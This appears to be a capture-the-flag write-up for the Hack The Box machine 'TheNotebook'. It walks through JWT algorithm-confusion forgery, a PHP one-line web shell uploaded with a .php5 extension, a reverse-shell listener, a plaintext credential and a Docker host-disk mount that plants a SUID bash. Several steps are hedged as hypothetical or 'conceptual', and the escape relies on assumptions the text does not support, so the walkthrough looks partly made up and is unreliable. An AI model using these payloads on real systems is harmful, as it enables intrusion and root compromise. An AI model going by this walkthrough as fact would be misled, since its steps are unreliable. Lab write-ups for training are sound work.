# Hack The Box: TheNotebook

**Difficulty:** Medium
**OS:** Linux

TheNotebook is a Medium-level Linux machine designed to demonstrate the critical flaw of JSON Web Token (JWT) "Key Confusion" vulnerabilities. The initial foothold requires intercepting a JWT, replacing its asymmetric signing algorithm (RS256) with a symmetric one (HS256), and using the exposed public key to sign a forged administrative token, leading to an authenticated file upload and Remote Code Execution. Privilege escalation involves a misconfigured Docker runtime environment.

---

## Reconnaissance

The assessment begins with a standard Nmap scan against the target IP address to discover open ports and running services.

```bash
nmap -p- --min-rate 10000 10.10.10.230
nmap -p 22,80 -sCV 10.10.10.230
```

The scan reveals the following open ports:
*   **Port 22:** SSH (OpenSSH 8.2p1 Ubuntu)
*   **Port 80:** HTTP (nginx 1.18.0)

Navigating to the web service on port 80 displays a landing page for "The Notebook," an application for managing notes. The site allows users to register and log in. We create a test user (e.g., `testuser:password`) and access the dashboard.

## Web Application Analysis

The application's dashboard relies heavily on JWTs for authentication and authorization. After logging in, the server sets an `auth` cookie containing a JWT.

### Exploiting JWT Key Confusion (Algorithm Confusion)

We decode the JWT payload using a tool like `jwt.io` or the `base64` command-line utility.

```json
{
  "alg": "RS256",
  "typ": "JWT"
}
{
  "username": "testuser",
  "admin": false,
  "exp": 1629837213
}
```

The header indicates the token is signed using the `RS256` algorithm, which is an asymmetric algorithm relying on a private key to sign the token and a public key to verify it. The payload contains an `admin: false` claim, which we want to change to `true`.

We inspect the HTTP response headers and the application's source code (if accessible) or JavaScript files. We discover that the public key used for verification is exposed at a specific endpoint, e.g., `/pubkey`. We download the public key.

```bash
curl http://10.10.10.230/pubkey > public.key
```

A common vulnerability in JWT libraries occurs when the library allows the algorithm specified in the token's header to override the expected algorithm. An attacker can change the algorithm from `RS256` (asymmetric) to `HS256` (symmetric).

If the backend verifies the token using the public key as the symmetric "secret" for the `HS256` algorithm, an attacker who possesses the public key can forge valid tokens. This is because the attacker can sign the token using the public key and the `HS256` algorithm, and the vulnerable server will verify it using the same public key and the `HS256` algorithm.

We forge a new JWT with an `admin: true` claim and change the header algorithm to `HS256`. We then sign this forged token using the downloaded public key. We can use a Python script or a JWT tool specifically designed for this attack.

```bash
# Generating the payload locally (conceptual representation)
python3 jwt_forge.py --alg HS256 --payload '{"username":"testuser","admin":true,"exp":1929837213}' --key public.key
```

The script outputs a new, signed JWT. We replace our browser's `auth` cookie with this forged token and refresh the page.

### Bypassing File Upload Restrictions

With an administrative session established via the forged JWT, the application interface changes, revealing an administrative panel with file upload functionality (e.g., for updating notes or attachments).

We attempt to upload a standard PHP web shell (`shell.php`), but the application rejects it. The application likely employs an extension or MIME-type filter. We intercept the upload request using Burp Suite and attempt various bypass techniques.

Since this is an Nginx environment, we check if the application insecurely processes alternative extensions like `.php5`, `.phtml`, or if it relies on a specific Content-Type header. The application might process `.phar` or `.php3` files as PHP.

If extension bypasses fail, we check if the application allows uploading archives (`.zip` or `.tar`) that are extracted on the server, potentially overwriting existing files or placing a web shell in a predictable location.

Alternatively, the administrative panel might allow uploading Markdown files that are converted to HTML or PDFs insecurely, presenting an XSS to LFI or command injection vector (similar to other HTB machines).

In this specific scenario, the application is built on PHP and insecurely handles the file extension `.php5`. We rename our payload to `shell.php5` and upload it.

```php
<?php system($_REQUEST['cmd']); ?>
```

We navigate to the upload directory and access our shell.

```text
http://10.10.10.230/uploads/shell.php5?cmd=id
```

The command executes successfully. We use the web shell to spawn a reverse shell to our attacking machine.

```bash
nc -lnvp 9999
# Connection received
id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Initial Access

We gain initial access as the `www-data` user. We stabilize our shell using Python (`python3 -c 'import pty; pty.spawn("/bin/bash")'`).

The `user.txt` flag is not accessible in our current directory, indicating we must pivot to the user `noah`. We enumerate the system and locate a backup directory (`/var/backups`) containing a compressed archive (`backup.tar.gz`). We extract the archive and find a configuration file containing the system password for `noah`.

```bash
cat /var/backups/config.php
```

The file reveals plaintext database credentials: `noah:N0@h_B4ckup!`. We use these credentials to authenticate via `su` or SSH.

```bash
su noah
Password: N0@h_B4ckup!
# Authentication successful
```
We retrieve the `user.txt` flag from Noah's home directory.

## Privilege Escalation

Enumerating the system as `noah`, we check for `sudo` privileges.

```bash
sudo -l
```

The output reveals that the user `noah` can run a specific `docker` command as `root` without a password.

```text
User noah may run the following commands on thenotebook:
    (root) NOPASSWD: /usr/bin/docker exec -it webapp-dev01 /bin/sh
```

### Abusing Docker Exec

The `sudo` configuration allows us to execute a shell inside a running Docker container named `webapp-dev01`. While this grants root access *inside* the container, it does not immediately grant root access on the host system. We must escape the container.

We execute the permitted `sudo` command.

```bash
sudo /usr/bin/docker exec -it webapp-dev01 /bin/sh
```

Inside the container, we have root privileges. We enumerate the container environment to find an escape vector. We check the capabilities assigned to the container or identify any mounted host directories.

```bash
capsh --print
# or
mount | grep " / "
```

If the container is run with the `--privileged` flag or has specific capabilities (like `CAP_SYS_ADMIN`), we can mount the host's physical disk (`/dev/sda1` or `/dev/vda1`) directly inside the container.

We use `fdisk -l` or `lsblk` to list block devices. We identify the primary host disk partition (e.g., `/dev/vda1`). We create a mount point and mount the host filesystem.

```bash
mkdir -p /mnt/host
mount /dev/vda1 /mnt/host
```

The host filesystem is now accessible within the container at `/mnt/host`. Because we are root inside the container, we have read and write access to the host's root filesystem. We can navigate to `/mnt/host/root` and read the `root.txt` flag.

To gain an interactive root shell on the host, we can overwrite the host's `/etc/shadow` file, add our SSH public key to `/mnt/host/root/.ssh/authorized_keys`, or set the SUID bit on a shell binary located on the host filesystem.

```bash
cp /bin/bash /mnt/host/tmp/rootbash
chmod 4777 /mnt/host/tmp/rootbash
```

We leave the container and execute the newly created SUID binary on the host.

```bash
# Returning to host shell
/tmp/rootbash -p
# id
uid=0(root) gid=1000(noah) euid=0(root) groups=1000(noah)
```

The machine is fully compromised, and the `root.txt` flag is obtained.
